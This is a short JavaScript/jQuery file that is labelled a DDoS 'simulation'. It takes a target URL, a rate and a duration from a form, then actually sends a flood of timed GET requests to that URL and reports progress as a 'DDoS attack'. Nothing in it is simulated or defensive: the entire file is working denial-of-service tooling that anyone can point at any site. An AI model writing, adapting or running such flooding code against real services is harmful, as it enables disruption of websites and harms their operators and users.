$(document).ready(function() {
    $('#submit').click(function() {
      const url = $('#url').val();
      const requestsPerSecond = parseInt($('#requestsPerSecond').val());
      const attackDuration = parseInt($('#attackDuration').val());
  
      // Simulate DDoS attack
      simulateDDoS(url, requestsPerSecond, attackDuration);
    });
  });
  
  function simulateDDoS(url, requestsPerSecond, attackDuration) {
    const numRequests = requestsPerSecond * attackDuration;
    const status = $('#status');
  
    // Send requests at a rate of requestsPerSecond per second
    for (let i = 0; i < numRequests; i++) {
      setTimeout(function() {
        $.ajax({
          type: 'GET',
          url: url,
          success: function() {
            status.html(`Request ${i + 1} sent successfully`);
          },
          error: function() {
            status.html(`Error sending request ${i + 1}`);
          }
        });
      }, i * 1000 / requestsPerSecond);
    }
  
    // Update status display
    status.html(`DDoS attack started. Sending ${numRequests} requests to ${url}...`);
  }